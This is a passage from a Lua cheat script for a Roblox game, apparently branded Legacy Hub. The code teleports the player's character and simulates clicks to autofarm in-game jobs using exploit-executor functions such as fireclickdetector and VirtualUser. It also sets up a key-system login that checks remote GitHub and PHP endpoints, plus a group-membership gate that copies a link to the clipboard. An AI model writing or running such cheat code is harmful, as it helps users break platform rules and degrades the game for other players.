					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
					end
				end;
				if not game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]") then
					tool = game.Players.LocalPlayer.Backpack:WaitForChild("[Lettuce]")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				game:GetService("VirtualUser"):ClickButton1(Vector2.new())
				local d = Vector3.new(-1006.99, -51.1542, -1014.33)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
			until not _G.lettuce
		end;
		if _G.bottle then
			repeat
				wait()
				local d = Vector3.new(116.81, 22.8002, -478.199)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
				local X;
				for Y, Z in pairs(game.Workspace.Ignored.HospitalJob:GetChildren()) do
					wait()
					if Z then
						if Z:IsA("Model") then
							if Z.Name == "Can I get the Green bottle" then
								X = "Green"
							end;
							if Z.Name == "Can I get the Red bottle" then
								X = "Red"
							end;
							if Z.Name == "Can I get the Blue bottle" then
								X = "Blue"
							end;
							print(X)
							print(Z)
							fireclickdetector(game.Workspace.Ignored.HospitalJob:FindFirstChild(X):FindFirstChild("ClickDetector"), 4)
							fireclickdetector(Z:FindFirstChild("ClickDetector"), 4)
							wait(3)
						end
					end
				end
			until not _G.bottle
		end
	end
end

if string.find(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/Legacy-Hub/main/.checks/.checksix'), '1') then
	local loaderGUI = Instance.new('ScreenGui');
	local mainFrame = Instance.new('ImageLabel');
	local topBarFrame = Instance.new('ImageLabel');
	local nameLabel = Instance.new('TextLabel');
	local keyBoxImage = Instance.new('ImageLabel');
	local keyBox = Instance.new('TextBox');
	local loginBtn = Instance.new('ImageButton');
	local loginLabel = Instance.new('TextLabel');

	loaderGUI.Name = 'loaderGUI';
	loaderGUI.Parent = game:GetService('CoreGui');
	loaderGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;

	mainFrame.Name = 'mainFrame';
	mainFrame.Parent = loaderGUI;
	mainFrame.AnchorPoint = Vector2.new(0.5, 0.5);
	mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	mainFrame.BackgroundTransparency = 1.000;
	mainFrame.BorderSizePixel = 0;
	mainFrame.Position = UDim2.new(0.5, 0, 0.477462441, 0);
	mainFrame.Size = UDim2.new(0, 376, 0, 123);
	mainFrame.Image = 'http://www.roblox.com/asset/?id=4530318781';
	mainFrame.ImageColor3 = Color3.fromRGB(30, 30, 30);
	mainFrame.ScaleType = Enum.ScaleType.Slice;
	mainFrame.SliceCenter = Rect.new(20, 20, 480, 480);

	topBarFrame.Name = 'topBarFrame';
	topBarFrame.Parent = mainFrame;
	topBarFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	topBarFrame.BackgroundTransparency = 1.000;
	topBarFrame.BorderSizePixel = 0;
	topBarFrame.Size = UDim2.new(1, 0, 0, 25);
	topBarFrame.Image = 'http://www.roblox.com/asset/?id=4530319192';
	topBarFrame.ImageColor3 = Color3.fromRGB(24, 24, 24);
	topBarFrame.ScaleType = Enum.ScaleType.Slice;
	topBarFrame.SliceCenter = Rect.new(20, 20, 480, 480);

	nameLabel.Name = 'nameLabel';
	nameLabel.Parent = topBarFrame;
	nameLabel.AnchorPoint = Vector2.new(0.5, 0.5);
	nameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	nameLabel.BackgroundTransparency = 1.000;
	nameLabel.BorderSizePixel = 0;
	nameLabel.Position = UDim2.new(0.5, 0, 0.5, 0);
	nameLabel.Size = UDim2.new(0, 70, 0, 20);
	nameLabel.Font = Enum.Font.SourceSansLight;
	nameLabel.Text = 'Key System';
	nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
	nameLabel.TextSize = 16.000;

	keyBoxImage.Name = 'keyBoxImage';
	keyBoxImage.Parent = mainFrame;
	keyBoxImage.AnchorPoint = Vector2.new(0.5, 0);
	keyBoxImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	keyBoxImage.BackgroundTransparency = 1.000;
	keyBoxImage.BorderSizePixel = 0;
	keyBoxImage.Position = UDim2.new(0.5, 0, 0, 35);
	keyBoxImage.Size = UDim2.new(1, -20, 0, 30);
	keyBoxImage.Image = 'http://www.roblox.com/asset/?id=4530318781';
	keyBoxImage.ImageColor3 = Color3.fromRGB(24, 24, 24);
	keyBoxImage.ScaleType = Enum.ScaleType.Slice;
	keyBoxImage.SliceCenter = Rect.new(20, 20, 480, 480);

	keyBox.Name = 'keyBox';
	keyBox.Parent = keyBoxImage;
	keyBox.AnchorPoint = Vector2.new(0.5, 0.5);
	keyBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	keyBox.BackgroundTransparency = 1.000;
	keyBox.BorderSizePixel = 0;
	keyBox.Position = UDim2.new(0.5, 0, 0.5, 0);
	keyBox.Size = UDim2.new(1, -5, 1, -5);
	keyBox.Font = Enum.Font.SourceSans;
	keyBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178);
	keyBox.PlaceholderText = 'KEY';
	keyBox.Text = '';
	keyBox.TextColor3 = Color3.fromRGB(215, 215, 215);
	keyBox.TextScaled = true;
	keyBox.TextSize = 18.000;

	loginBtn.Name = 'loginBtn';
	loginBtn.Parent = mainFrame;
	loginBtn.AnchorPoint = Vector2.new(0.5, 0);
	loginBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	loginBtn.BackgroundTransparency = 1.000;
	loginBtn.BorderSizePixel = 0;
	loginBtn.ClipsDescendants = true;
	loginBtn.Position = UDim2.new(0.5, 0, 0, 72);
	loginBtn.Size = UDim2.new(1, -20, 0, 38);
	loginBtn.Image = 'http://www.roblox.com/asset/?id=4530318781';
	loginBtn.ImageColor3 = Color3.fromRGB(24, 24, 24);
	loginBtn.ScaleType = Enum.ScaleType.Slice;
	loginBtn.SliceCenter = Rect.new(20, 20, 480, 480);
	loginBtn.MouseButton1Click:Connect(function()
		if string.find(keyBox.Text, game:HttpGet('http://legacyteam.unaux.com/ks/checkpoint/Get.php')) then
			loaderGUI:Destroy();
			local notifSound = Instance.new("Sound",workspace)
			notifSound.PlaybackSpeed = 1.5
			notifSound.Volume = 0.15
			notifSound.SoundId = "rbxassetid://170765130"
			notifSound.PlayOnRemove = true
			notifSound:Destroy()
			game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Logging In", Icon = "rbxassetid://505845268", Duration = 15, Button1 = "Okay"})
			Init();
		else
			local notifSound = Instance.new("Sound",workspace)
			notifSound.PlaybackSpeed = 1.5
			notifSound.Volume = 0.15
			notifSound.SoundId = "rbxassetid://2755928629"
			notifSound.PlayOnRemove = true
			notifSound:Destroy()
			game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Incorrect Key", Icon = "rbxassetid://7054687858", Duration = 15, Button1 = "Okay"})
		end;
	end);

	loginLabel.Name = 'loginLabel';
	loginLabel.Parent = loginBtn;
	loginLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	loginLabel.BackgroundTransparency = 1.000;
	loginLabel.BorderSizePixel = 0;
	loginLabel.Size = UDim2.new(1, 0, 1, 0);
	loginLabel.Font = Enum.Font.SourceSansItalic;
	loginLabel.Text = 'Login';
	loginLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
	loginLabel.TextSize = 20.000;

	local function Dragify()
		local script = Instance.new('LocalScript', mainFrame);
		local UIS = game:GetService('UserInputService');
		function dragify(Frame)
			dragToggle = nil;
			local dragSpeed = 0.50;
			dragInput = nil;
			dragStart = nil;
			local dragPos = nil;
			function updateInput(input)
				local Delta = input.Position - dragStart;
				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y);
				game:GetService('TweenService'):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play();
			end;
			Frame.InputBegan:Connect(function(input)
				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
					dragToggle = true;
					dragStart = input.Position;
					startPos = Frame.Position;
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragToggle = false;
						end;
					end);
				end;
			end);
			Frame.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input;
				end;
			end);
			game:GetService('UserInputService').InputChanged:Connect(function(input)
				if input == dragInput and dragToggle then
					updateInput(input);
				end;
			end);
		end;
		dragify(script.Parent);
	end
	coroutine.wrap(Dragify)();
elseif string.find(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/Legacy-Hub/main/.checks/.checksix'), '2') then
	if game:GetService('Players').LocalPlayer:IsInGroup(7658734) then
		Init();
	else
		setclipboard('https://www.roblox.com/groups/7658734/Legacy-X#!/about')
		game.StarterGui:SetCore("SendNotification", {
			Title = "Legacy Hub - Load failed";
			Text = "you need to join the group copied to you clipboard to use this script";
			Duration = 20;
		})
	end;
end;